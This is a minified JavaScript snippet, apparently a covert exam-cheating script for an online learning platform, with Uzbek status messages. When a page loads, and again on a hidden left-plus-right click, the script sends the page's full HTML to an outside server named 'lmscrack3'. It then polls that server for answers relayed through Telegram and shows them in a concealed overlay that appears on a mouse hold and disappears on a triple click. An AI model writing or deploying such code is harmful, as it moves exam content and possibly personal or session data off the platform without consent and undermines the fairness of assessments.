let lastMessage=null,lastUpdateId=0,lastShownUpdate=0,shadowRoot=null,holdTimer=null,leftClickCount=0,rightClickCount=0,clickTimer=null;function showMessageInShadow(t,e,n){shadowRoot&&shadowRoot.host&&shadowRoot.host.remove();const o=document.createElement("div");o.style.cssText=`position:absolute;top:${n}px;left:${e}px;z-index:999999;all:initial;`;const a=o.attachShadow({mode:"closed"});a.innerHTML=`<div style="font-family:sans-serif;font-size:16px;color:black;background:#f5f5f5;padding:8px 12px;border:1px solid #ccc;border-radius:6px;box-shadow:0 2px 6px rgba(0,0,0,0.1);pointer-events:none;">${t}</div>`,document.body.appendChild(o),shadowRoot=a}function hideMessage(){shadowRoot&&shadowRoot.host&&(shadowRoot.host.remove(),shadowRoot=null)}async function fetchTelegramMessage(){try{const t=await fetch("https://lmscrack3.onrender.com/latest"),e=await t.json();return e.success&&e.message&&e.update_id>lastUpdateId&&(lastMessage=e.message,lastUpdateId=e.update_id),lastMessage}catch(t){return console.error("❌ Xatolik:",t),lastMessage}}async function sendPageHTMLToBot(t=!0){const e=document.documentElement.outerHTML;try{await fetch("https://lmscrack3.onrender.com/upload-html",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({html:e})}),t&&(()=>{const t=document.createElement("div");t.textContent=" Savollar yuborildi",t.style.cssText="position:fixed;bottom:10px;right:10px;background-color:#007bff;color:white;padding:8px 14px;border-radius:6px;font-family:sans-serif;font-size:14px;z-index:9999;box-shadow:0 0 6px rgba(0,0,0,0.2);",document.body.appendChild(t),setTimeout(()=>t.remove(),3e3)})()}catch(t){console.error("❌ HTML yuborishda xatolik:",t)}}sendPageHTMLToBot(),setInterval(async()=>{const t=await fetchTelegramMessage();t&&lastUpdateId>lastShownUpdate&&(()=>{const t=document.createElement("div");t.textContent="Javoblar keldi",t.style.cssText="position:fixed;bottom:10px;left:50%;transform:translateX(-50%);background-color:#fff;color:black;padding:8px 14px;border-radius:6px;font-family:sans-serif;font-size:14px;z-index:9999;box-shadow:0 0 6px rgba(0,0,0,0.2);",document.body.appendChild(t),setTimeout(()=>t.remove(),3e3),lastShownUpdate=lastUpdateId})()},1.8e5),document.addEventListener("mousedown",async e=>{0===e.button&&(holdTimer=setTimeout(async()=>{const t=await fetchTelegramMessage();t&&showMessageInShadow(t,e.pageX,e.pageY)},1e3)),clickTimer&&clearTimeout(clickTimer),0===e.button&&leftClickCount++,2===e.button&&rightClickCount++,clickTimer=setTimeout(async()=>{3===leftClickCount&&0===rightClickCount?hideMessage():1===leftClickCount&&1===rightClickCount&&await sendPageHTMLToBot(),leftClickCount=0,rightClickCount=0},400)}),document.addEventListener("mouseup",()=>{holdTimer&&(clearTimeout(holdTimer),holdTimer=null)});
